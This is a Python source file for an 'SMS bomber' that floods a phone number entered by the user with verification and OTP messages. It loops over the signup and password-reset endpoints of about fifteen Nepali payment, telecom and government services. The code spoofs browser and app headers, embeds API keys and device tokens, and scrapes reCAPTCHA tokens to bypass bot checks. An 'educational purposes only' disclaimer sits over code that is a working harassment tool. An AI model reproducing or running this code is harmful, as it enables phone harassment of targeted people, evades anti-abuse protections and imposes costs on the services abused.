import uuid
from datetime import datetime
from random import random
from constants import *
import requests
from requests.structures import CaseInsensitiveDict

"""
INFO DOCUMENTATION:
    BomberHelper class contains all the methods to bomb the numbers.
    Each method is responsible for bombing a specific service.
    Each method takes a number as a parameter and bombs it.
    The methods are static and can be called without creating an instance of the class.
    The methods are named as <service_name>_bomb.
    The API calls are made using the requests library.
    The APIs are defined in the constants.py file.
    The APIs are defined as a dictionary and are converted to a class using the apis_model_from_dict method.
    The class is then used to access the APIs.
    THE APIs ARE NOT MY OWN. I HAVE JUST USED THEM TO BOMB THE NUMBERS SOLELY FOR EDUCATIONAL PURPOSES. 
    I AM NOT RESPONSIBLE FOR ANY DAMAGE CAUSED BY THE USE OF THIS CODE.
    **USE AT YOUR OWN RISK**.
    
    --------------------------------------------------------------------------------
    The methods are:
    1. sajilo_pay_bomb
    2. icash_bomb
    3. moco_bomb
    4. ncell_bomb
    5. khalti_bomb
    6. ime_phone_bomb
    7. ime_register_bomb
    8. prabhu_tv_bomb
    9. moru_bomb
    10. nid_bomb
    11. upaya_bomb
    12. nagrik_bomb
    13. pathao_bomb
    14. prabhu_pay_bomb
    15. online_sathi
    --------------------------------------------------------------------------------
    
    The methods are called in the main method.
    The main method takes the number and the number of times to bomb as input.
    The main method calls each method in a loop for the number of times to bomb.
    
    --------------------------------------------------------------------------------
    
    Disclaimer: This is for educational purposes only. I am not responsible for any misuse of this code or any damage 
    caused by this code. 
    
    --------------------------------------------------------------------------------
    
 * Copyright 2022 Joseph Yaduvanshi. All rights reserved.
 * Licensed under the Apache License, Version 2.0 (the "License");
 * You may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 * http://www.apache.org/licenses/LICENSE-2.0
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 * This file is part of the Random_X library.
 * The RandomX library is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY.
 * Author: Joseph Yaduvanshi
"""


class BomberHelper:
    @staticmethod
    def store_bomber_data(bomber_data):
        with open('store.txt', 'w') as file:
            file.write(f'{bomber_data[0]}\n{bomber_data[1]}')
            file.close()

    @staticmethod
    def get_bomber_data():
        with open('store.txt', 'r') as file:
            data = file.readlines()
            file.close()
            return data

    @staticmethod
    def solve_recaptcha_v3_ntc():
        session = requests.Session()
        url = "https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LepE78UAAAAAKne5Q-GYf4ilPAK-nkz_OUhZkM9&co" \
              "=aHR0cHM6Ly93d3cubnRjLm5ldC5ucDo0NDM.&hl=en&v=Km9gKuG06He-isPsP6saG8cn&size=invisible&cb=z6mvlf9montt "
        resp = session.get(url)
        recaptcha_token = resp.text.split('name="recaptcha-token" value="')[1].split('"')[0]
        url = "https://www.google.com/recaptcha/api2/reload?k=6LepE78UAAAAAKne5Q-GYf4ilPAK-nkz_OUhZkM9"
        headers = CaseInsensitiveDict()
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        data = f"c={recaptcha_token}&reason=q&k=6LepE78UAAAAAKne5Q-GYf4ilPAK-nkz_OUhZkM9"
        resp = session.post(url, headers=headers, data=data)
        rresp = resp.text.split('["')[1].split('"')[0]
        print(rresp)
        return rresp

    @staticmethod
    def ntc_register_bomb(number: str):
        url = "https://cms.ntc.net.np/api/register"
        headers = CaseInsensitiveDict()
        headers["accept"] = "application/json, text/plain, */*"
        headers["accept-encoding"] = "gzip, deflate, br"
        headers["accept-language"] = "en"
        headers["Content-Type"] = "application/json"
        headers["origin"] = "https://www.ntc.net.np"
        headers["referer"] = "https://www.ntc.net.np/"
        headers["sec-ch-ua"] = 'Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"'
        headers["sec-ch-ua-mobile"] = "?0"
        headers["sec-ch-ua-platform"] = 'macOS"'
        headers["sec-fetch-dest"] = "empty"
        headers["sec-fetch-mode"] = "cors"
        headers["sec-fetch-site"] = "same-site"
        headers[
            "user-agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) " \
                            "Chrome/107.0.0.0 Safari/537.36 "

        data = {"phone": "9866193143", "password": "aquarious", "repassword": "aquarious",
                "recaptchaToken": BomberHelper.solve_recaptcha_v3_ntc(),
                "forgot_password": True}

        resp = requests.post(url, headers=headers, data=data)
        print(resp.json()["rresp"])

    @staticmethod
    def random_alpha_string(length: int) -> str:
        ascii_lowercase = 'abcdefghijklmnopqrstuvwxyz'
        ascii_uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
        ascii_letters = ascii_lowercase + ascii_uppercase
        return ''.join([ascii_letters[int(random() * len(ascii_letters))] for _ in range(length)])

    @staticmethod
    def random_string(string_length=10):
        random_ = str(uuid.uuid4())
        random_ = random_.upper()
        random_ = random_.replace("-", "")
        return str(random_[0:string_length])

    @staticmethod
    def khalti_bomb(number):
        try:
            url = KhaltiApis.khaltiApi
            response = requests.post(url, json={"id": number})
            if response.text.__contains__("verification_token"):
                print("Khalti Bomb Sent")
            else:
                print("Khalti Bomb Failed")
        except Exception as e:
            print(e)

    @staticmethod
    def ime_phone_bomb(number):
        try:
            url = ImeApi.imeiApi
            response = requests.post(url,
                                     json={"FullName": BomberHelper.random_alpha_string(length=5), "Msisdn": number,
                                           "AppVersion": "3.4.1",
                                           "CountryCode": "977", "PhoneBrand": "iPhone", "OsVersion": "15.5",
                                           "PhoneOs": "IOS"})

            if response.text.__contains__("Verification code has been sent to your mobile number"):
                print("IME Phone Bomb Sent")
            else:
                print("IME Phone Bomb Failed")
        except Exception as e:
            print(e)

    @staticmethod
    def ime_register_bomb(number):
        try:
            url = ImeApi.imeiApi2
            response = requests.post(url, json={"FullName": "user", "Msisdn": number, "AppVersion": "3.4.1",
                                                "CountryCode": "977", "PhoneBrand": "iPhone", "OsVersion": "15.5",
                                                "PhoneOs": "IOS"},
                                     headers={"Authorization": "Basic Og==", "api-key": "fAfw3a9uMEhDibFAY-xVzB"
                                                                                        ":APA91bFOdqGDaL4Im6"
                                                                                        "9OxA3cjlBIrQq6"
                                                                                        "iQJ2RENRo4Wet6f4Q"
                                                                                        "vM3S9Y630kVZtl "
                                                                                        "sO6jijQ7L3U_aX6WVTLcmU9OvzB"
                                                                                        "-A3xDGuniHslnZvKV8WiuBlg"
                                                                                        "GyRRZ6IycNQdnI7QqGYeYT1vjc"})
            if response.text.__contains__(
                    "Verification code has been sent to your mobile number"):
                print("IME Register Bomb Sent")
            else:
                if response.text == "You are trying to login with new device. Please reset your device and try again.":
                    BomberHelper.ime_phone_bomb(number)
                else:
                    print("IME Register Bomb Failed")
        except Exception as e:
            print(e)

    @staticmethod
    def nagrik_bomb(number):
        try:
            url = f"{Nagrik.NagrikApi}{number}?hash_id=h7R5yhAzGFr"
            response = requests.post(url, json={"app_version": "1.5.5", "device_model": "sdk_gphone64_arm64",
                                                "device_name": "sdk_gphone64_arm64", "os_version": "12",
                                                "device_type": "android",
                                                "fcm_id": "cTmO-0wIT_OlVrpIBuRbjS:APA91bFonB3PG_Eilm6LoJ"
                                                          "-f4YFwjdjKpleDZyRg1ZOUyhvi7rpKoKwDkxx1jB13dvzI6GXL_NpzFtqvs0Oz6LSrDu92H3P0SPq5YYK-JCO1jRH14ctxaS9lk4NjQhfE9VRW9g_AWanb"},
                                     headers={
                                         'user-agent': 'Dart/2.16(dart:io)',
                                         'request_time': '1627400000',
                                         'app_version_code': '79',
                                         'app_version': '1.5.5',
                                         'device_type': 'Android',
                                         'Connection': 'close',
                                     })
            if response.text.__contains__("unique_id"):
                print("Nagrik Bomb Sent")
            else:
                print(response.text)
                print("Nagrik Bomb Failed")
        except Exception as e:
            print(e)

    @staticmethod
    def upaya_bomb(number):
        url = Upaya.UpayaApi
        headers = CaseInsensitiveDict()
        headers["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
        email = BomberHelper.random_alpha_string(length=5) + "@gmail.com"
        data = f"first_name=Sylas{BomberHelper.random_alpha_string(length=5)}&last_name=Op{BomberHelper.random_alpha_string(length=5)}&phone={number}&email={email}&password=aquarious&address=Maitidevi%2C%20Kathmandu%2C%20Nepal&lat=27.7051799&lng=85.33494329999999&register_from=Website&is_org=No&hasBranch=no&legalName=&org_email=&panno=&hasPan=no&org_address=&org_address_lat=&org_address_lng=&referredby=&refUserID=No&refuserType=No&referred_area=&terms=accepted&privacy=accepted "
        resp = requests.post(url, headers=headers, data=data)
        print(resp.text)
        user = resp.json().get("user")
        print(user)
        if user is not None:
            BomberHelper.store_bomber_data([user, email])
            print("test")
        if resp.text.__contains__("success"):
            print("Upaya Bomb Sent")
        if resp.text.__contains__("User Exists"):
            user = BomberHelper.get_bomber_data()
            BomberHelper.upaya_resend_bomb(number=number, email=user[1], user=user[0].strip())
        else:
            print("Upaya Bomb Failed")

    @staticmethod
    def upaya_resend_bomb(number, user, email):
        url = Upaya.UpayaApi2
        headers = CaseInsensitiveDict()
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        data = f"verify_user={user}&phone={number}&email={email}"
        resp = requests.post(url, headers=headers, data=data)
        if resp.text.__contains__("success"):
            print("Upara Forget Bomb ReSent")
        else:
            print("Upara Forget Bomb Failed")

    @staticmethod
    def nid_bomb(number):
        session = requests.Session()
        try:
            url = NID.NIDApi

            headers = CaseInsensitiveDict()
            headers[
                "Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng," \
                            "*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 "
            headers["Accept-Encoding"] = "gzip, deflate"
            headers["Accept-Language"] = "en-GB,en;q=0.9"
            headers["Cache-Control"] = "max-age=0"
            headers["Connection"] = "keep-alive"
            headers["Content-Length"] = "0"
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            headers["Cookie"] = "SERVERID=a1"
            headers["Host"] = f"{NID.NIDHost}"
            headers["Origin"] = f"{NID.NIDOrigin}"
            headers["Referer"] = f"{NID.NIDReferer}"
            headers["Upgrade-Insecure-Requests"] = "1"
            headers[
                "User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, " \
                                "like Gecko) Chrome/107.0.0.0 Safari/537.36 "

            resp = session.post(url, headers=headers)
            cookies = resp.cookies["JSESSIONID"]
            print(cookies)
            if resp.status_code == 200:
                url = NID.NIDAPi2
                headers = CaseInsensitiveDict()
                headers[
                    "Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp," \
                                "image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 "
                headers["Accept-Encoding"] = "gzip, deflate"
                headers["Accept-Language"] = "en-GB,en-US;q=0.9,en;q=0.8,id;q=0.7"
                headers["Cache-Control"] = "max-age=0"
                headers["Connection"] = "keep-alive"
                headers["Content-Type"] = "application/x-www-form-urlencoded"
                headers["Cookie"] = f"JSESSIONID={cookies}; SERVERID=a1"
                headers["Content-Length"] = "23"
                headers["Host"] = NID.NIDHost
                headers["Origin"] = NID.NIDOrigin
                headers["Referer"] = NID.NIDReferer
                headers["Upgrade-Insecure-Requests"] = "1"
                headers[
                    "User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, " \
                                    "like Gecko) Chrome/107.0.0.0 Safari/537.36 "

                data = f"mobileNumber={number}"
                resp = session.post(url, headers=headers, data=data)
                if resp.text.__contains__("A message with a verification code has been sent"):
                    print("NID Bomb Sent")
                else:
                    print("NID Bomb Not Sent")
            else:
                print("NID Bomb Failed")
        except Exception as e:
            print(e)

    @staticmethod
    def pathao_bomb(number):
        url = Pathao.PathaoApi
        headers = CaseInsensitiveDict()
        headers["Host"] = Pathao.PathaoHost
        headers["Content-Type"] = "application/json"
        headers["Accept"] = "*/*"
        headers["Connection"] = "keep-alive"
        headers["Accept-Encoding"] = "br;q=1.0, gzip;q=0.9, deflate;q=0.8"
        headers["User-Agent"] = Pathao.PathaoUA
        headers["Accept-Language"] = "en-NP;q=1.0"
        headers["Content-Length"] = "70"
        headers["App-Agent"] = "ride/ios/238"
        data = {"national_number": number, "country_prefix": "977", "country_id": 2}
        resp = requests.post(url, headers=headers, json=data)
        if resp.text.__contains__("Message sent"):
            print("Pathao Bomb Sent")
        else:
            print("Pathao Bomb Failed")

    @staticmethod
    def moru_bomb(number):
        url = Moru.MoruApi
        headers = CaseInsensitiveDict()
        headers["user-agent"] = "Dart/2.16 (dart:io)"
        headers["Content-Type"] = "application/json"
        headers["Accept-Encoding"] = "gzip, deflate"
        headers["host"] = Moru.MoruHost
        headers["Connection"] = "close"
        data = {"phone": number}
        resp = requests.post(url, headers=headers, json=data)
        if resp.text.__contains__("secret"):
            print("Moru Bomb Sent")
        else:
            print(resp.text)
            print("Moru Bomb Failed")

    @staticmethod
    def prabhu_pay_bomb(number: str):
        url = PrabhuPay.PrabhuPayApi
        headers = CaseInsensitiveDict()
        headers["Host"] = PrabhuPay.PrabhuPayHost
        headers["Content-Type"] = "application/json"
        headers["Connection"] = "keep-alive"
        headers["Accept"] = "*/*"
        headers["User-Agent"] = PrabhuPay.PrabhuPayUA
        headers["Accept-Language"] = "en-GB,en-US;q=0.9,en;q=0.8"
        headers["Accept-Encoding"] = "gzip, deflate, br"
        data = {"longitude": "0", "newRegister": True, "deviceType": "ios", "fullName": "", "countryCode": "NP",
                "mobileNumber": number, "email": "", "latitude": "0", "deviceToken": "string", "badgeId": "string"}
        resp = requests.post(url, headers=headers, json=data)
        print(resp.text)
        if resp.text.__contains__('"message": "Success"'):
            print("Prabhu Pay Bomb Sent")
        elif resp.text.__contains__('Mobile Number or Email already registered'):
            print("Prabhu Pay Bomb Failed")
        else:
            print("Prabhu Pay Bomb Failed")

    @staticmethod
    def prabhu_pay_forget_bomb(number: str):
        url = PrabhuPay.PrabhuPayApi2
        headers = CaseInsensitiveDict()
        headers["Host"] = PrabhuPay.PrabhuPayHost
        headers["Content-Type"] = "application/json"
        headers["Connection"] = "keep-alive"
        headers["Accept"] = "*/*"
        headers["User-Agent"] = PrabhuPay.PrabhuPayUA
        headers["Content-Length"] = "22"
        headers["Accept-Language"] = "en-GB,en-US;q=0.9,en;q=0.8"
        headers["Accept-Encoding"] = "gzip, deflate, br"
        data = {"email": number}
        resp = requests.post(url, headers=headers, json=data)
        print(resp.text)
        if resp.text.__contains__('Activation Code has been sent successfully'):
            print("Prabhu Pay Forget Bomb Sent")
        else:
            print("Prabhu Pay Forget Bomb Failed")

    @staticmethod
    def prabhu_tv_bomb(number):
        url = PrabhuTv.PrabhuTvApi
        headers = CaseInsensitiveDict()
        headers["Host"] = PrabhuTv.PrabhuTvHost
        headers["Content-Type"] = "application/json"
        headers["Accept-Encoding"] = "gzip, deflate, br"
        headers["Connection"] = "keep-alive"
        headers["Accept"] = "*/*"
        headers["User-Agent"] = PrabhuTv.PrabhuTvUA
        headers["Accept-Language"] = "en-NP;q=1"
        headers["Content-Length"] = "206"
        headers["X-Requested-With"] = "XMLHttpRequest"
        mail = BomberHelper.random_alpha_string(length=8) + "@gmail.com"
        print(mail)
        data = {"password_confirmation": "", "password": "aquarious", "device_version": "16.1.1", "last_name": "",
                "user_email": "dwdw@protonmail.com", "telephone": number, "device_model": "iPhone13,4",
                "first_name": "sylas" + BomberHelper.random_alpha_string(length=4)}
        resp = requests.post(url, headers=headers, json=data)
        print(resp.text)
        if resp.text.__contains__('"message": "Success"'):
            print("Prabhu TV Bomb Sent")
        else:
            print("Prabhu TV Bomb Failed")

    @staticmethod
    def sajilo_pay_bomb(number):
        url = SajiloAPI.SajiloPayAPI
        headers = CaseInsensitiveDict()
        headers["Host"] = SajiloAPI.SajiloHost
        headers["Content-Type"] = "application/json"
        headers["User-Agent"] = SajiloAPI.SajiloUA
        headers["Connection"] = "keep-alive"
        headers["app-authorizer"] = "647061697361"
        headers["Accept"] = "application/json"
        headers["Accept-Language"] = "en-GB,en-US;q=0.9,en;q=0.8"
        headers["Accept-Encoding"] = "gzip, deflate, br"
        data = {"mobile_no": number}
        print(data)
        resp = requests.post(url, headers=headers, json=data)
        print(resp.text)
        if resp.text.__contains__('OTP Request queued'):
            print("Sajilo Pay Bomb Sent")
        else:
            print("Sajilo Pay Bomb Failed")

    @staticmethod
    def icash_bomb(number):
        url = IcashApi.IcashApi
        headers = CaseInsensitiveDict()
        headers["Host"] = IcashApi.IcashHost
        headers["Content-Type"] = "application/json"
        headers["User-Agent"] = IcashApi.IcashUA
        headers["Connection"] = "keep-alive"
        headers["app-authorizer"] = "647061697361"
        headers["Accept"] = "application/json"
        headers["Accept-Language"] = "en-GB,en-US;q=0.9,en;q=0.8"
        headers["Content-Length"] = "26"
        headers["Accept-Encoding"] = "gzip, deflate, br"
        data = {"mobile_no": number}
        resp = requests.post(url, headers=headers, json=data)
        print(resp.text)
        if resp.text.__contains__('OTP Request queued'):
            print("Icash Pay Bomb Sent")
        else:
            print("Icash Pay Bomb Failed")

    @staticmethod
    def moco_bomb(number):
        url = f"{Moco.MocoApi}{number}"
        headers = CaseInsensitiveDict()
        headers["Host"] = Moco.MocoHost
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        headers["Origin"] = "ionic://localhost"
        headers["Accept"] = "application/json, text/plain, */*"
        headers[
            "User-Agent"] = "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, " \
                            "like Gecko) Mobile/15E148 "
        headers["Accept-Language"] = "en-GB,en-US;q=0.9,en;q=0.8"
        headers["Accept-Encoding"] = "gzip, deflate, br"
        headers["Connection"] = "keep-alive"
        resp = requests.get(url, headers=headers)
        if resp.text.__contains__('USER_SIGNUP_CODE_SEND_OK'):
            print("Moco Bomb Sent")
        else:
            print("Moco Bomb Failed")

    @staticmethod
    def ncell_bomb(number: str):
        url = Ncell.NcellApi
        headers = CaseInsensitiveDict()
        headers["Host"] = Ncell.NcellHost
        headers["Accept"] = "application/json"
        headers["Content-Type"] = "application/json"
        headers["Connection"] = "keep-alive"
        headers["Accept-Language"] = "en-GB,en-US;q=0.9,en;q=0.8"
        headers["Accept-Encoding"] = "gzip, deflate, br"
        headers["User-Agent"] = Ncell.NcellUA
        data = {"generateOTPRequest": {"action": "LOGIN", "msisdn": number,
                                       "deviceId": "E0C1C3CC-B9D6-4BEE-8938-AA2007135669"},
                "requestHeader": {"connectionType": "wifi", "timestamp": datetime.now().__str__(), "channel": "sca",
                                  "deviceId": "E0C1C3CC-B9D6-4BEE-8938-AA2007135669", "deviceType": "ios",
                                  "requestId": "1669499979672NCELL9369", "clientip": "N/A", "action": "LOGIN",
                                  "msisdn": number, "deviceModel": "iPhone", "location": "N/A",
                                  "languageCode": "1", "ratePlanName": "", "appVersion": "5.0.7",
                                  "primaryMsisdn": number, "ratePlanId": "", "paidMode": ""}}
        resp = requests.post(url, headers=headers, json=data)
        if resp.text.__contains__('Successfully generated'):
            print("Ncell Bomb Sent")
        else:
            print("Ncell Bomb Failed")

    @staticmethod
    def online_sathi(number: str):
        session = requests.Session()
        url = OnlineSathi.OnlineSathiApi
        resp = session.get(url)
        _token = resp.text.split('name="_token" value="')[1].split('"')[0]
        _csrf = resp.text.split('name="csrf-token" content="')[1].split('"')[0]
        _cookies = resp.cookies
        url = OnlineSathi.OnlineSathiApi2
        headers = CaseInsensitiveDict()
        headers["accept"] = "*/*"
        headers["accept-encoding"] = "gzip, deflate, br"
        headers["accept-language"] = "en-GB,en-US;q=0.9,en;q=0.8,id;q=0.7"
        headers["content-length"] = "99"
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        headers["origin"] = OnlineSathi.OnlineSathiOrigin
        headers["referer"] = OnlineSathi.OnlineSathiReferer
        headers["sec-ch-ua"] = 'Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"'
        headers["sec-ch-ua-mobile"] = "?0"
        headers["sec-ch-ua-platform"] = 'macOS"'
        headers["sec-fetch-dest"] = "empty"
        headers["sec-fetch-mode"] = "cors"
        headers["sec-fetch-site"] = "same-origin"
        headers[
            "user-agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) " \
                            "Chrome/107.0.0.0 Safari/537.36 "
        headers["x-csrf-token"] = _csrf
        headers["x-requested-with"] = "XMLHttpRequest"
        data = f"mobile_number={number}&type=register&for=customer&_token={_token}"
        resp1 = session.post(url, headers=headers, data=data, cookies=_cookies)
        print("Online Sathi Bomb Sent")


def main():
    try:
        number = input("Enter the number to bomb: ")
        try:
            number_of_bombs = int(input("Enter the number of times to bombs: "))
        except ValueError:
            print("Invalid number of bombs; Please enter a valid number\n")
            number_of_bombs = int(input("Enter the number of times to bombs: "))
        while number_of_bombs < 1 or not number_of_bombs.strip().isdigit():
            print("Number of bombs must be greater than 0")
            number_of_bombs = int(input("Enter the number of times to bombs: "))
        while number.strip().__len__() != 10 or not number.strip().isdigit():
            print("Invalid number")
            number = input("Enter the number to bomb: ")
        for i in range(number_of_bombs):
            BomberHelper.sajilo_pay_bomb(number)
            BomberHelper.icash_bomb(number)
            BomberHelper.moco_bomb(number)
            BomberHelper.ncell_bomb(number)
            BomberHelper.khalti_bomb(number)
            BomberHelper.ime_phone_bomb(number)
            BomberHelper.ime_register_bomb(number)
            # BomberHelper.prabhu_tv_bomb(number)
            BomberHelper.moru_bomb(number)
            BomberHelper.nid_bomb(number)
            BomberHelper.upaya_bomb(number)
            BomberHelper.nagrik_bomb(number)
            BomberHelper.pathao_bomb(number)
            BomberHelper.prabhu_pay_bomb(number)
            BomberHelper.online_sathi(number)
            print(f"Bombed {i + 1}")
    except Exception as e:
        main()
        print(e)


if __name__ == '__main__':
    print_welcome()
    main()
